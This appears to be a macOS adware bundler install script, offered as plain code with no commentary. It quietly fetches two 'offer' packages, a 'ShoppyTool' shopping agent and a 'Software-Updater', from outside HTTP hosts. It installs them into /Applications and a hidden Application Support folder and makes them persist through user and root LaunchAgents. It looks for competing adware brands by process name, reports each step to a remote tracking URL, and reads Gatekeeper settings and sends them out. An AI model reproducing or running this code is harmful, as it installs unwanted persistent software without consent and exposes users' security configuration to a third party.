#!/bin/bash
waitFor() {
    # Wait for 5 mins
    while ((SECONDS < 600)); do
        kill -0 $1 >/dev/null 2>&1
        if [ $? = 1 ]; then
            # Process finished, return proccess exit code
            wait $1
            return $?
        fi
        sleep 1
    done

    echo Installation timed out.
    return 22
}

tracking() {
    trackingUrl="http://service.srvmacinfo.com/tracking/cm_mac.php?clickid=54572400474442142&${1}"
    curl -s -L -o /dev/null "$trackingUrl"
    #echo Tracking $trackingUrl
}

reportExecuteStatus() {
    returnCode=$?
    if [ "$returnCode" = "0" ]; then
        tracking currins=$insname
        return $returnCode
    else
        tracking errors=$insname:returnCode:$returnCode
    fi
}

mmtmp="/private/tmp/.mminstallerscripts_`date +%Y%m%d%H%M%S`"
mkdir -p $mmtmp

if [ -z "$SUDO_USER" ]; then
    INSTALLER_USER="$USER"
else
    INSTALLER_USER="$SUDO_USER"
fi

tracking funnel=installOffersStart
sleep 1



{



# --------------------------------------------------------------------------------

tracking funnel=installing_webtools

insname="webtools"
echo ---------- $insname ----------

# existing check
brands=(flashmall webshoppers webshoppy smartshoppy shoptool shoppytool coolshopper easyshopper liveshoppers smart-shoppy easy-shopper bestwebshoppers hotshoppy bestsmartshoppers)
brandExists=false
for currBrand in "${brands[@]}"; do
    if [ `pgrep -i $currBrand | wc -l` -gt 0 ]; then
        brandExists=$currBrand
    fi
done


brand="ShoppyTool"
source="tgo-1624"
timestamp=$(date +%s)

brand_lower_case=$(echo "${brand}" | tr '[:upper:]' '[:lower:]')
compressed_filename="MM${brand}"

url="http://cdn.get${brand_lower_case}.com/download/Mac/InstallerResources/${compressed_filename}.tar.gz"
tmpfile="${mmtmp}/${insname}.tar.gz"
uuid="54572400474442142"

# set parameters from command line (source and brand)
while (( "$#" )); do
  if [[ $1 == --brand=* ]]; then
    brand=${1#*=}
    shift
    continue
  fi

  if [[ $1 == --source=* ]]; then
    source=${1#*=}
    shift
    continue
  fi
  shift
done



label="com.${brand}.agent"
plist_filename="${label}.plist"

applications_folder="/Applications"
install_folder="${applications_folder}/${brand}"
old_executable="${install_folder}/launch"
new_executable="${install_folder}/${brand}"
plist_user="$HOME/Library/LaunchAgents/${plist_filename}"
plist_root="/Library/LaunchAgents/${plist_filename}"

orig_plist_filename="com.plist"
orig_plist_path="${install_folder}/${orig_plist_filename}"

/bin/rm -rf $install_folder
curl -s -L -o $tmpfile $url
sudo -u $INSTALLER_USER tar -xzf $tmpfile -C $applications_folder

sudo -u $INSTALLER_USER mv "${applications_folder}/${compressed_filename}" $install_folder
sudo -u $INSTALLER_USER mv $old_executable $new_executable

my_name=`who | grep -v mbsetup | head -n1 | awk '{print $1}'`
applications_support="/Users/${my_name}/Library/Application Support"
sudo -u $INSTALLER_USER mkdir -p "${applications_support}/.${brand}"
sudo -u $INSTALLER_USER cp -rf "${install_folder}" "${applications_support}/.${brand}"

sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Set Label $label" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:0 string $new_executable" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:1 string -guid" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:2 string $uuid" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:3 string -source" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:4 string $source" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:5 string -brand" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:6 string $brand" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:7 string -dt" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:8 string $timestamp" $orig_plist_path

if [ "$EUID" -ne 0 ]; then
  # user
  launchctl unload $plist_user >> ${mmtmp}/${insname}.log 2>&1
  /bin/rm -f $plist_user
  cp $orig_plist_path $plist_user
  launchctl load -w $plist_user  >> ${mmtmp}/${insname}.log 2>&1
else
  # root
  launchctl unload $plist_root >> ${mmtmp}/${insname}.log 2>&1
  sudo -u $INSTALLER_USER launchctl unload $plist_user >> ${mmtmp}/${insname}.log 2>&1
  /bin/rm -f $plist_root
  cp $orig_plist_path $plist_root
  sudo -u root launchctl load -w $plist_root >> ${mmtmp}/${insname}.log 2>&1
    # user
  sudo -u $INSTALLER_USER /bin/rm -f $plist_user
  sudo -u $INSTALLER_USER cp $orig_plist_path $plist_user
  sudo -u $INSTALLER_USER launchctl load -w $plist_user  >> ${mmtmp}/${insname}.log 2>&1
fi

/bin/rm $orig_plist_path
/bin/rm $tmpfile

if [ "$brandExists" = false ]; then
    tracking currins=$insname
else
    tracking c5=$brandExists
fi



# --------------------------------------------------------------------------------

tracking funnel=installing_macupdater

insname=macupdater
echo ---------- $insname ----------

brand="Software-Updater"
brand_lower_case=$(echo "${brand}" | tr '[:upper:]' '[:lower:]')
compressed_filename="MM${brand}"
domain="macsoftwareupdater"



#compressed_filename="MMUpdater"
url="http://cdn.${domain}.com/download/Mac/InstallerResources/${compressed_filename}.tar.gz"
tmpfile="${mmtmp}/${insname}.tar.gz"
uuid="54572400474442142"
default_source="tgo-1624"
default_software_name=$brand

software_name="$default_software_name"
source="$default_source"

label=com."${software_name}.agent"
plist_filename="${label}.plist"

applications_folder="/Applications"
install_folder="/Applications/${software_name}"
old_executable="${install_folder}/macupdater"
new_executable="${install_folder}/${software_name}"
plist_user="$HOME/Library/LaunchAgents/${plist_filename}"
plist_root="/Library/LaunchAgents/${plist_filename}"

orig_plist_filename="com.plist"
orig_plist_path="${install_folder}/${orig_plist_filename}"
uuid_file="${install_folder}/guid.txt"
source_file="${install_folder}/source.txt"

/bin/rm -rf $install_folder
curl -s -L -o $tmpfile $url
sudo -u $INSTALLER_USER tar -xzf $tmpfile -C $applications_folder
sudo -u $INSTALLER_USER mv "${applications_folder}/${compressed_filename}" $install_folder
sudo -u $INSTALLER_USER mv $old_executable $new_executable

sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Set Label $label" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:0 string $new_executable" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:1 string -guid" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:2 string $uuid" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:3 string -source" $orig_plist_path
sudo -u $INSTALLER_USER /usr/libexec/PlistBuddy -c "Add ProgramArguments:4 string $source" $orig_plist_path


if [ "$EUID" -ne 0 ]; then
    # user
    launchctl unload $plist_user >> ${mmtmp}/${insname}.log 2>&1
    /bin/rm -f $plist_user
    cp $orig_plist_path $plist_user
    launchctl load -w $plist_user  >> ${mmtmp}/${insname}.log 2>&1
else
    # user
    sudo -u $INSTALLER_USER launchctl unload $plist_user >> ${mmtmp}/${insname}.log 2>&1
    sudo -u $INSTALLER_USER /bin/rm -f $plist_user
    sudo -u $INSTALLER_USER cp $orig_plist_path $plist_user
    sudo -u $INSTALLER_USER launchctl load -w $plist_user  >> ${mmtmp}/${insname}.log 2>&1
    # root
    launchctl unload $plist_root >> ${mmtmp}/${insname}.log 2>&1
    /bin/rm -f $plist_root
    cp $orig_plist_path $plist_root
    launchctl load -w $plist_root >> ${mmtmp}/${insname}.log 2>&1
fi

/bin/rm $orig_plist_path
/bin/rm $tmpfile

# currently always report install
tracking currins=$insname


sleep 1

if [ "$EUID" -ne 0 ]; then
    tracking "funnel=installOffersDone(noroot)"
else
    tracking "funnel=installOffersDone"
fi

spctl=`spctl --status -v`;
appstorestr='assessments enabled';
devsignstr='developer id enabled';
setting=0
appstore=false
devsign=false

if [[ $spctl =~ .*${appstorestr}.* ]]
then
    appstore=true
fi

if [[ $spctl =~ .*${devsignstr}.* ]]
then
    devsign=true
fi

if [[ "$appstore" = true && "$devsign" = false ]]
then
    setting=1
else
    if [[ "$appstore" = true && "$devsign" = true ]]
    then
        setting=2
    else
        if [[ "$appstore" = false && "$devsign" = false ]]
        then
            setting=3
        fi
    fi
fi

tracking "c6=${setting}"


/bin/rm -rf "${mmtmp}"



} >> ${mmtmp}/install.log 2>&1
